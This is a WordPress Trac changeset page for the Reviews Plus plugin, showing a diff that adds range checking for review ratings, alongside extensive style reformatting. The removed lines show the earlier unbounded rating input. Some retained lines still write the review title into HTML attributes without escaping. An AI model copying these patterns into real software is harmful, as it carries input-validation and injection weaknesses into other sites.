=== Content from plugins.trac.wordpress.org_46ba0dab_20250114_230642.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2618234)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/2618233 "Changeset 2618233")
* [Next Changeset](/changeset/2618235 "Changeset 2618235") →

---

# Changeset 2618234

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
10/22/2021 09:52:18 AM
([3 years](/timeline?from=2021-10-22T09%3A52%3A18Z&precision=second "See timeline at 10/22/2021 09:52:18 AM") ago)

Author:
impleCode
Message:

Make sure that the provided rating is within the correct range

Location:
[reviews-plus/trunk](/browser/reviews-plus/trunk?rev=2618234)
Files:

5 edited

* [ext/woocommerce.php](/browser/reviews-plus/trunk/ext/woocommerce.php?rev=2618234 "Show entry in browser")
  (modified)
  ([4 diffs](#file0 "Show differences"))
* [functions/functions.php](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234 "Show entry in browser")
  (modified)
  ([46 diffs](#file1 "Show differences"))
* [includes/includes.php](/browser/reviews-plus/trunk/includes/includes.php?rev=2618234 "Show entry in browser")
  (modified)
  ([10 diffs](#file2 "Show differences"))
* [readme.txt](/browser/reviews-plus/trunk/readme.txt?rev=2618234 "Show entry in browser")
  (modified)
  ([2 diffs](#file3 "Show differences"))
* [reviews-plus.php](/browser/reviews-plus/trunk/reviews-plus.php?rev=2618234 "Show entry in browser")
  (modified)
  ([1 diff](#file4 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [reviews-plus/trunk/ext/woocommerce.php](/changeset/2618234/reviews-plus/trunk/ext/woocommerce.php "Show the changeset 2618234 restricted to reviews-plus/trunk/ext/woocommerce.php")

  | [r2606660](/browser/reviews-plus/trunk/ext/woocommerce.php?rev=2606660#L1 "Show revision 2606660 of this file in browser") | [r2618234](/browser/reviews-plus/trunk/ext/woocommerce.php?rev=2618234#L1 "Show revision 2618234 of this file in browser") |  |
  | --- | --- | --- |
  | 1 | 1 | <?php |
  | 2 | 2 |  |
  | 3 |  | if ( !defined( 'ABSPATH' ) ) { |
  |  | 3 | if ( ! defined( 'ABSPATH' ) ) { |
  | 4 | 4 | exit; // Exit if accessed directly |
  | 5 | 5 | } |
  | […](/browser/reviews-plus/trunk/ext/woocommerce.php?rev=2606660#L16) | […](/browser/reviews-plus/trunk/ext/woocommerce.php?rev=2618234#L16) |  |
  | 16 | 16 | $post\_types = get\_ic\_review\_active\_post\_types(); |
  | 17 | 17 | if ( in\_array( 'product', $post\_types ) ) { |
  | 18 |  | if ( isset( $\_POST[~~'ic\_review\_rating'~~ ] ) ) { |
  | 19 |  | $\_POST[~~'rating' ] = intval( $\_POST[ 'ic\_review\_rating'~~ ] ); |
  |  | 18 | if ( isset( $\_POST['ic\_review\_rating'] ) ) { |
  |  | 19 | $\_POST['rating'] = ic\_sanitize\_rating( $\_POST['ic\_review\_rating'] ); |
  | 20 | 20 | } |
  | 21 | 21 | //remove\_filter( 'preprocess\_comment', array( 'WC\_Comments', 'check\_comment\_rating' ), 0 ); |
  | […](/browser/reviews-plus/trunk/ext/woocommerce.php?rev=2606660#L27) | […](/browser/reviews-plus/trunk/ext/woocommerce.php?rev=2618234#L27) |  |
  | 27 | 27 | function ic\_ic\_revs\_tab( $tabs ) { |
  | 28 | 28 | remove\_filter( 'the\_content', 'show\_auto\_ic\_reviews', 30 ); |
  | 29 |  | $count = ''; |
  | 30 |  | $tabs[~~'reviews' ]~~  = array( |
  | 31 |  | 'title' => sprintf( \_\_( 'Reviews%s', 'reviews-plus' ), $count ), |
  | 32 |  | 'priority' => 50, |
  | 33 |  | 'callback' => 'ic\_add\_ic\_rev\_form' |
  |  | 29 | $count           = ''; |
  |  | 30 | $tabs['reviews'] = array( |
  |  | 31 | 'title'    => sprintf( \_\_( 'Reviews%s', 'reviews-plus' ), $count ), |
  |  | 32 | 'priority' => 50, |
  |  | 33 | 'callback' => 'ic\_add\_ic\_rev\_form' |
  | 34 | 34 | ); |
  | 35 | 35 |  |
  | […](/browser/reviews-plus/trunk/ext/woocommerce.php?rev=2606660#L40) | […](/browser/reviews-plus/trunk/ext/woocommerce.php?rev=2618234#L40) |  |
  | 40 | 40 |  |
  | 41 | 41 | function ic\_get\_woocommerce\_rev\_rating( $rating, $review\_id ) { |
  | 42 |  | if ( !empty( $rating ) ) { |
  |  | 42 | if ( ! empty( $rating ) ) { |
  | 43 | 43 | return $rating; |
  | 44 | 44 | } |
  | 45 | 45 | $woo\_rating = empty( $review\_id ) ? 0 : intval( get\_comment\_meta( $review\_id, 'rating', true ) ); |
  |  | 46 |  |
  | 46 | 47 | return $woo\_rating; |
  | 47 | 48 | } |
* ## [reviews-plus/trunk/functions/functions.php](/changeset/2618234/reviews-plus/trunk/functions/functions.php "Show the changeset 2618234 restricted to reviews-plus/trunk/functions/functions.php")

  | [r2606660](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L1 "Show revision 2606660 of this file in browser") | [r2618234](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L1 "Show revision 2618234 of this file in browser") |  |
  | --- | --- | --- |
  | 1 | 1 | <?php |
  | 2 |  | if ( !defined( 'ABSPATH' ) ) { |
  |  | 2 | if ( ! defined( 'ABSPATH' ) ) { |
  | 3 | 3 | exit; // Exit if accessed directly |
  | 4 | 4 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L7) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L7) |  |
  | 7 | 7 | \* Manages product reviews functions |
  | 8 | 8 | \* |
  | 9 |  | \* @version1.0.0 |
  | 10 |  | \* @packagereviews-plus/functions |
  | 11 |  | \* @author Norbert Dreszer |
  |  | 9 | \* @version        1.0.0 |
  |  | 10 | \* @package        reviews-plus/functions |
  |  | 11 | \* @author        Norbert Dreszer |
  | 12 | 12 | \*/ |
  | 13 | 13 | add\_filter( 'ic\_products\_type\_support', 'ic\_enable\_comments\_support' ); |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L17) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L17) |  |
  | 17 | 17 | \* |
  | 18 | 18 | \* @param array $support |
  |  | 19 | \* |
  | 19 | 20 | \* @return string |
  | 20 | 21 | \*/ |
  | 21 | 22 | function ic\_enable\_comments\_support( $support ) { |
  | 22 | 23 | $support[] = 'comments'; |
  |  | 24 |  |
  | 23 | 25 | return $support; |
  | 24 | 26 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L41) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L43) |  |
  | 41 | 43 | \* |
  | 42 | 44 | \* @param type $review\_id |
  |  | 45 | \* |
  | 43 | 46 | \* @return type |
  | 44 | 47 | \*/ |
  | 45 | 48 | function ic\_get\_ic\_rev\_rating( $review\_id ) { |
  | 46 |  | $rating = empty( $review\_id ) ? 0 : intval( get\_comment\_meta( $review\_id, 'ic\_review\_rating', true ) ); |
  | 47 |  | return apply\_filters( 'ic\_get\_ic\_rev\_rating', $rating, $review\_id ); |
  |  | 49 | $rating          = empty( $review\_id ) ? 0 : intval( get\_comment\_meta( $review\_id, 'ic\_review\_rating', true ) ); |
  |  | 50 | $filtered\_rating = apply\_filters( 'ic\_get\_ic\_rev\_rating', $rating, $review\_id ); |
  |  | 51 |  |
  |  | 52 | return ic\_sanitize\_rating( $filtered\_rating ); |
  |  | 53 | } |
  |  | 54 |  |
  |  | 55 | /\*\* |
  |  | 56 | \* Checks if the rating value is correct |
  |  | 57 | \* |
  |  | 58 | \* @param $rating |
  |  | 59 | \* |
  |  | 60 | \* @return int |
  |  | 61 | \*/ |
  |  | 62 | function ic\_sanitize\_rating( $rating ) { |
  |  | 63 | $sanitized\_rating = intval( $rating ); |
  |  | 64 | if ( $sanitized\_rating > 5 || $sanitized\_rating < 0 ) { |
  |  | 65 | return 0; |
  |  | 66 | } |
  |  | 67 |  |
  |  | 68 | return $sanitized\_rating; |
  | 48 | 69 | } |
  | 49 | 70 |  |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L52) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L73) |  |
  | 52 | 73 | \* |
  | 53 | 74 | \* @param int $review\_id |
  |  | 75 | \* |
  | 54 | 76 | \* @return string |
  | 55 | 77 | \*/ |
  | 56 | 78 | function ic\_ic\_rev\_rating( $review\_id = 0, $editable = null, $label = null, $rating = null ) { |
  | 57 | 79 | $reviews\_settings = get\_ic\_reviews\_sep\_settings(); |
  | 58 |  | if ( !~~empty( $reviews\_settings[ 'disable\_rating'~~ ] ) ) { |
  |  | 80 | if ( ! empty( $reviews\_settings['disable\_rating'] ) ) { |
  | 59 | 81 | return; |
  | 60 | 82 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L62) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L84) |  |
  | 62 | 84 | $rating = empty( $review\_id ) ? 0 : ic\_get\_ic\_rev\_rating( $review\_id ); |
  | 63 | 85 | } |
  | 64 |  | if ( !empty( $editable ) ) { |
  |  | 86 | if ( ! empty( $editable ) ) { |
  | 65 | 87 | $return = '<p class="review-rating allow-edit"><input type="hidden" name="ic\_review\_rating" value="' . $rating . '">'; |
  | 66 | 88 | } else { |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L70) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L92) |  |
  | 70 | 92 | $label = \_\_( 'Your Rating', 'reviews-plus' ); |
  | 71 | 93 | } |
  | 72 |  | if ( !empty( $label ) ) { |
  |  | 94 | if ( ! empty( $label ) ) { |
  | 73 | 95 | $return .= '<label class="rating-label" for="ic\_review\_rating">' . $label . '</label>'; |
  | 74 | 96 | } |
  | 75 |  | for ( $i = 1; $i <= $rating; $i++ ) { |
  |  | 97 | for ( $i = 1; $i <= $rating; $i ++ ) { |
  | 76 | 98 | $return .= '<span class="rating-on rate-' . $i . '" data-rating="' . $i . '"></span>'; |
  | 77 | 99 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L85) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L107) |  |
  | 85 | 107 | } |
  | 86 | 108 | $off\_rating = 5 - $rating; |
  | 87 |  | for ( $i = 1; $i <= $off\_rating; $i++ ) { |
  | 88 |  | $a = $i + $rating; |
  | 89 |  | $return .= '<span class="rating-off rate-' . $a . '" data-rating="' . $a . '"></span>'; |
  |  | 109 | for ( $i = 1; $i <= $off\_rating; $i ++ ) { |
  |  | 110 | $a      = $i + $rating; |
  |  | 111 | $return .= '<span class="rating-off rate-' . $a . '" data-rating="' . $a . '"></span>'; |
  | 90 | 112 | } |
  | 91 | 113 |  |
  | 92 | 114 | $return .= '</p>'; |
  |  | 115 |  |
  | 93 | 116 | return $return; |
  | 94 | 117 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L98) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L121) |  |
  | 98 | 121 | \* |
  | 99 | 122 | \* @param type $review\_id |
  |  | 123 | \* |
  | 100 | 124 | \* @return type |
  | 101 | 125 | \*/ |
  | 102 | 126 | function ic\_get\_ic\_rev\_title( $review\_id ) { |
  | 103 | 127 | $title = empty( $review\_id ) ? '' : get\_comment\_meta( $review\_id, 'ic\_review\_title', true ); |
  |  | 128 |  |
  | 104 | 129 | return $title; |
  | 105 | 130 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L107) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L132) |  |
  | 107 | 132 | /\*\* |
  | 108 | 133 | \* Returns review title edit HTML |
  |  | 134 | \* |
  | 109 | 135 | \* @param type $review\_id |
  | 110 | 136 | \* @param type $label |
  |  | 137 | \* |
  | 111 | 138 | \* @return string |
  | 112 | 139 | \*/ |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L116) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L143) |  |
  | 116 | 143 | } |
  | 117 | 144 | $return = '<p class="comment-form-title">'; |
  | 118 |  | if ( !empty( $label ) ) { |
  |  | 145 | if ( ! empty( $label ) ) { |
  | 119 | 146 | $return .= '<label for="review-title">' . $label . '</label> '; |
  | 120 | 147 | } |
  | 121 |  | $return  .= '<input type="text" value="' . ic\_get\_ic\_rev\_title( $review\_id ) . '" name="ic\_review\_title" id="review-title">'; |
  | 122 |  | $return  .= '</p>'; |
  |  | 148 | $return .= '<input type="text" value="' . ic\_get\_ic\_rev\_title( $review\_id ) . '" name="ic\_review\_title" id="review-title">'; |
  |  | 149 | $return .= '</p>'; |
  |  | 150 |  |
  | 123 | 151 | return $return; |
  | 124 | 152 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L130) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L158) |  |
  | 130 | 158 | \* |
  | 131 | 159 | \* @param type $query |
  |  | 160 | \* |
  | 132 | 161 | \* @return type |
  | 133 | 162 | \*/ |
  | 134 | 163 | function ic\_remove\_reviews\_from\_anywhere( $query ) { |
  | 135 |  | $comment\_type = ic\_get\_comment\_type(); |
  | 136 |  | $comment\_types = ic\_get\_active\_comment\_types(); |
  | 137 |  | if ( (~~$key           = array\_search( $comment\_type, $comment\_types )~~) !== false ) { |
  |  | 164 | $comment\_type  = ic\_get\_comment\_type(); |
  |  | 165 | $comment\_types = ic\_get\_active\_comment\_types(); |
  |  | 166 | if ( ( $key = array\_search( $comment\_type, $comment\_types ) ) !== false ) { |
  | 138 | 167 | unset( $comment\_types[ $key ] ); |
  | 139 | 168 | } |
  | 140 |  | if ( !~~is\_ic\_post\_type\_review\_enabled() && !is\_ic\_revs\_admin\_screen() && (!function\_exists( 'is\_ic\_catalog\_admin\_page' ) || (function\_exists( 'is\_ic\_catalog\_admin\_page' ) && !is\_ic\_catalog\_admin\_page())~~) ) { |
  | 141 |  | if ( defined( 'DOING\_AJAX' ) && DOING\_AJAX && isset( $\_REQUEST[~~'p'~~ ] ) ) { |
  | 142 |  | $post\_id~~= intval( $\_REQUEST[ 'p'~~ ] ); |
  | 143 |  | $post\_type = get\_post\_type( $post\_id ); |
  | 144 |  | $review\_post\_types = get\_ic\_review\_active\_post\_types(); |
  |  | 169 | if ( ! is\_ic\_post\_type\_review\_enabled() && ! is\_ic\_revs\_admin\_screen() && ( ! function\_exists( 'is\_ic\_catalog\_admin\_page' ) || ( function\_exists( 'is\_ic\_catalog\_admin\_page' ) && ! is\_ic\_catalog\_admin\_page() ) ) ) { |
  |  | 170 | if ( defined( 'DOING\_AJAX' ) && DOING\_AJAX && isset( $\_REQUEST['p'] ) ) { |
  |  | 171 | $post\_id           = intval( $\_REQUEST['p'] ); |
  |  | 172 | $post\_type         = get\_post\_type( $post\_id ); |
  |  | 173 | $review\_post\_types = get\_ic\_review\_active\_post\_types(); |
  | 145 | 174 | if ( ic\_string\_contains( $post\_type, 'al\_product' ) || in\_array( $post\_type, $review\_post\_types ) ) { |
  | 146 | 175 | return; |
  | 147 | 176 | } |
  | 148 | 177 | } |
  | 149 |  | $query->query\_vars[~~'type\_\_not\_in'~~ ] = $comment\_types; |
  |  | 178 | $query->query\_vars['type\_\_not\_in'] = $comment\_types; |
  | 150 | 179 | //$query->query\_vars[ 'type\_\_not\_in' ] = array( 'ic\_rev' ); |
  | 151 |  | } else if ( is\_ic\_post\_type\_review\_enabled() || (~~function\_exists( 'is\_ic\_product\_page' ) && is\_ic\_product\_page()~~) ) { |
  |  | 180 | } else if ( is\_ic\_post\_type\_review\_enabled() || ( function\_exists( 'is\_ic\_product\_page' ) && is\_ic\_product\_page() ) ) { |
  | 152 | 181 | //$query->query\_vars[ 'type' ] = $comment\_types; |
  | 153 |  | if ( !ic\_show\_old\_comments() ) { |
  | 154 |  | $query->query\_vars[~~'type'~~ ] = array( $comment\_type ); |
  |  | 182 | if ( ! ic\_show\_old\_comments() ) { |
  |  | 183 | $query->query\_vars['type'] = array( $comment\_type ); |
  | 155 | 184 | } |
  | 156 | 185 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L163) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L192) |  |
  | 163 | 192 | } |
  | 164 | 193 |  |
  | 165 |  | if ( !function\_exists( 'ic\_time\_ago' ) ) { |
  |  | 194 | if ( ! function\_exists( 'ic\_time\_ago' ) ) { |
  | 166 | 195 |  |
  | 167 | 196 | function ic\_time\_ago( $type = 'comment' ) { |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L175) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L204) |  |
  | 175 | 204 | function ic\_get\_comment\_type( $object = null, $post\_type = null ) { |
  | 176 | 205 | $comment\_type = ''; |
  | 177 |  | if ( empty( $object ) && is\_admin() && isset( $\_GET[~~'comment\_type'~~ ] ) ) { |
  | 178 |  | $comment\_type = sanitize\_text\_field( $\_GET[~~'comment\_type'~~ ] ); |
  |  | 206 | if ( empty( $object ) && is\_admin() && isset( $\_GET['comment\_type'] ) ) { |
  |  | 207 | $comment\_type = sanitize\_text\_field( $\_GET['comment\_type'] ); |
  | 179 | 208 | } else { |
  | 180 | 209 | if ( empty( $post\_type ) ) { |
  | 181 |  | if ( !empty( $object ) ) { |
  |  | 210 | if ( ! empty( $object ) ) { |
  | 182 | 211 | if ( is\_int( $object ) ) { |
  | 183 | 212 | $post\_type = get\_post\_type( $object ); |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L188) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L217) |  |
  | 188 | 217 | $post\_type = get\_post\_type(); |
  | 189 | 218 | } |
  | 190 |  | if ( isset( $\_GET[~~'post\_type' ] ) && empty( $post\_type ) && !empty( $\_GET[ 'post\_type'~~ ] ) ) { |
  | 191 |  | $post\_type = sanitize\_text\_field( $\_GET[~~'post\_type'~~ ] ); |
  |  | 219 | if ( isset( $\_GET['post\_type'] ) && empty( $post\_type ) && ! empty( $\_GET['post\_type'] ) ) { |
  |  | 220 | $post\_type = sanitize\_text\_field( $\_GET['post\_type'] ); |
  | 192 | 221 | } |
  | 193 |  | if ( isset( $\_GET[~~'page' ] ) && $\_GET[ 'page'~~ ] == 'ic\_reviews\_post' ) { |
  |  | 222 | if ( isset( $\_GET['page'] ) && $\_GET['page'] == 'ic\_reviews\_post' ) { |
  | 194 | 223 | $post\_type = 'post'; |
  | 195 | 224 | } |
  | 196 | 225 | } |
  | 197 |  | if ( !empty( $post\_type ) ) { |
  |  | 226 | if ( ! empty( $post\_type ) ) { |
  | 198 | 227 | if ( $post\_type == 'al\_product' ) { |
  | 199 | 228 | $comment\_type = 'ic\_rev'; |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L203) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L232) |  |
  | 203 | 232 | } |
  | 204 | 233 | } |
  |  | 234 |  |
  | 205 | 235 | return apply\_filters( 'ic\_reviews\_comment\_type', $comment\_type ); |
  | 206 | 236 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L219) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L249) |  |
  | 219 | 249 | } |
  | 220 | 250 | } |
  |  | 251 |  |
  | 221 | 252 | return $types; |
  | 222 | 253 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L226) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L257) |  |
  | 226 | 257 | \* |
  | 227 | 258 | \* @param type $product\_id |
  |  | 259 | \* |
  | 228 | 260 | \* @return int |
  | 229 | 261 | \*/ |
  | 230 | 262 | function ic\_get\_product\_review\_totals( $product\_id ) { |
  | 231 |  | $comment\_type = ic\_get\_comment\_type( $product\_id ); |
  | 232 |  | $args = array( 'type' => $comment\_type, 'post\_id' => $product\_id, 'status' => 'approve' ); |
  | 233 |  | $reviews = get\_comments( $args ); |
  | 234 |  | $total = array( 0, 0, 0, 0, 0, 0, 'total' => 0 ); |
  |  | 263 | $comment\_type = ic\_get\_comment\_type( $product\_id ); |
  |  | 264 | $args         = array( 'type' => $comment\_type, 'post\_id' => $product\_id, 'status' => 'approve' ); |
  |  | 265 | $reviews      = get\_comments( $args ); |
  |  | 266 | $total        = array( 0, 0, 0, 0, 0, 0, 'total' => 0 ); |
  | 235 | 267 | foreach ( $reviews as $review ) { |
  | 236 |  | $rating              = ic\_get\_ic\_rev\_rating( $review->comment\_ID ); |
  | 237 |  | $total[ $rating ]    += 1; |
  | 238 |  | if ( !empty( $rating ) ) { |
  | 239 |  | $total[ 'total' ] += 1; |
  | 240 |  | } |
  | 241 |  | } |
  |  | 268 | $rating           = ic\_get\_ic\_rev\_rating( $review->comment\_ID ); |
  |  | 269 | $total[ $rating ] += 1; |
  |  | 270 | if ( ! empty( $rating ) ) { |
  |  | 271 | $total['total'] += 1; |
  |  | 272 | } |
  |  | 273 | } |
  |  | 274 |  |
  | 242 | 275 | return $total; |
  | 243 | 276 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L256) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L289) |  |
  | 256 | 289 | \* |
  | 257 | 290 | \* @param type $atts |
  |  | 291 | \* |
  | 258 | 292 | \* @return type |
  | 259 | 293 | \*/ |
  | 260 | 294 | function ic\_average\_review\_shortcode( $atts ) { |
  | 261 |  | $args = shortcode\_atts( array( 'id' => get\_the\_ID() ), $atts ); |
  | 262 |  | $product\_id~~= intval( $args[ 'id'~~ ] ); |
  | 263 |  | if ( !empty( $product\_id ) ) { |
  |  | 295 | $args       = shortcode\_atts( array( 'id' => get\_the\_ID() ), $atts ); |
  |  | 296 | $product\_id = intval( $args['id'] ); |
  |  | 297 | if ( ! empty( $product\_id ) ) { |
  | 264 | 298 | return ic\_get\_reviews\_average\_html( $product\_id ); |
  | 265 | 299 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L270) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L304) |  |
  | 270 | 304 | \* |
  | 271 | 305 | \* @param type $product\_id |
  |  | 306 | \* |
  | 272 | 307 | \* @return type |
  | 273 | 308 | \*/ |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L277) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L312) |  |
  | 277 | 312 | } |
  | 278 | 313 | $average = ic\_get\_reviews\_average( $product\_id ); |
  |  | 314 |  |
  | 279 | 315 | return ic\_ic\_rev\_rating( 0, false, null, $average ); |
  | 280 | 316 | } |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L284) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L320) |  |
  | 284 | 320 | \* |
  | 285 | 321 | \* @param type $product\_id |
  |  | 322 | \* |
  | 286 | 323 | \* @return int |
  | 287 | 324 | \*/ |
  | 288 | 325 | function ic\_get\_reviews\_average( $product\_id ) { |
  | 289 |  | $totals = ic\_get\_product\_review\_totals( $product\_id ); |
  | 290 |  | $total\_summary~~= $totals[ 'total'~~ ]; |
  | 291 |  | if ( !empty( $total\_summary ) ) { |
  | 292 |  | unset( $totals[~~'total'~~ ] ); |
  | 293 |  | unset( $totals[~~0~~ ] ); |
  |  | 326 | $totals        = ic\_get\_product\_review\_totals( $product\_id ); |
  |  | 327 | $total\_summary = $totals['total']; |
  |  | 328 | if ( ! empty( $total\_summary ) ) { |
  |  | 329 | unset( $totals['total'] ); |
  |  | 330 | unset( $totals[0] ); |
  | 294 | 331 | krsort( $totals ); |
  | 295 | 332 | $total\_achieved = 0; |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L297) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L334) |  |
  | 297 | 334 | $total\_achieved += $key \* $total; |
  | 298 | 335 | } |
  | 299 |  | $max         = $total\_summary \* 5; |
  | 300 |  | $total\_score = number\_format( ($total\_achieved / $max) \* 5, 1 ); |
  |  | 336 | $max         = $total\_summary \* 5; |
  |  | 337 | $total\_score = number\_format( ( $total\_achieved / $max ) \* 5, 1 ); |
  |  | 338 |  |
  | 301 | 339 | return $total\_score; |
  | 302 | 340 | } |
  |  | 341 |  |
  | 303 | 342 | return 0; |
  | 304 | 343 | } |
  | 305 | 344 |  |
  | 306 | 345 | function ic\_get\_review\_totals\_html( $product\_id ) { |
  | 307 |  | $totals = ic\_get\_product\_review\_totals( $product\_id ); |
  | 308 |  | $total\_summary~~= $totals[ 'total'~~ ]; |
  |  | 346 | $totals        = ic\_get\_product\_review\_totals( $product\_id ); |
  |  | 347 | $total\_summary = $totals['total']; |
  | 309 | 348 | if ( empty( $total\_summary ) ) { |
  | 310 | 349 | return; |
  | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2606660#L312) | […](/browser/reviews-plus/trunk/functions/functions.php?rev=2618234#L351) |  |
  | 312 | 351 | $html = '<div class="review-totals">'; |
  | 313 | 352 |  |
  | 314 |  | unset( $totals[~~'total'~~ ] ); |
  | 315 |  | unset( $totals[~~0~~ ] ); |
  |  | 353 | unset( $totals['total'] ); |
  |  | 354 | unset( $totals[0] ); |
  | 316 | 355 | krsort( $totals ); |
  | 317 |  | $total\_achieved = 0; |
  | 318 |  | $reviews\_break = '<div class="reviews-break">'; |
  |  | 356 | $total\_achieved = 0; |
  |  | 357 | $reviews\_break  = '<div class="reviews-break">'; |
  | 319 | 358 | foreach ( $totals as $key => $total ) { |
  | 320 |  | $stars\_label = ic\_get\_stars\_label( $key ); |
  | 321 |  | $reviews\_break .= '<div class="review-total-' . $key . ' review-total-row"><div class="stars-count">' . $stars\_label . '</div> ' . ic\_stars\_qty\_graph( $total, $total\_summary ) . ' <div class="row-total">' . $total . '</div></div>'; |
  | 322 |  | $total\_achieved += $key \* $total; |
  | 323 |  | } |
  | 324 |  | $reviews\_break .= '</div>'; |
  | 325 |  | $attr = ''; |
  | 326 |  | if ( !~~function\_exists( 'is\_ic\_product\_page' ) || (function\_exists( 'is\_ic\_product\_page' ) && !is\_ic\_product\_page()~~) ) { |
  |  | 359 | $stars\_label    = ic\_get\_stars\_label( $key ); |
  |  | 360 | $reviews\_break  .= '<div class="review-total-' . $key . ' review-total-row"><div class="stars-count">' . $stars\_label . '</div> ' . ic\_stars\_qty\_graph( $total, $total\_summary ) . ' <div class="row-total">' . $total . '</div></div>'; |
  |  | 361 | $total\_achieved += $key \* $total; |
  |  | 362 | } |
  |  | 363 | $reviews\_break .= '</div>'; |
  |  | 364 | $attr          = ''; |
  |  | 365 | if ( ! function\_exists( 'is\_ic\_product\_page' ) || ( function\_exists( 'is\_ic\_product\_page' ) && ! is\_ic\_product\_page() ) ) { |
  | 327 | 366 | $attr = ' itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating"'; |
  | 328 | 367 | } |
  | 329 | 368 | $html .= '<div class="reviews-summary"><span' . $attr . '>'; |
  | 330 |  | if ( !empty( $attr ) ) { |
  |  | 369 | if ( ! empty( $attr ) ) { |
  | 331 | 370 | $html .= '<meta itemprop="itemReviewed" content="' . get\_the\_title( $product\_id ) . '">'; |
  | 332 | 371 | } |
  | 333 |  | if ( !empty( $total\_summary ) ) { |
  | 334 |  | $max         = $total\_summary \* 5; |
  | 335 |  | $total\_score = number\_format( ($total\_achieved / $max) \* 5, 1 ); |
  | 336 |  | if ( !empty( $attr ) ) { |
  | 337 |  | $attr1   = ' itemprop="ratingValue"'; |
  | 338 |  | $attr2   = ' itemprop="bestRating"'; |
  | 339 |  | $attr3   = ' itemprop="ratingCount"'; |
  | 340 |  | } |
  | 341 |  | $span1   = '<span' . $attr1 . '>' . $total\_score . '</span>'; |
  | 342 |  | $span2   = '<span' . $attr2 . '>5</span>'; |
  | 343 |  | $span3   = '<span' . $attr3 . '>' . $total\_summary . '</span>'; |
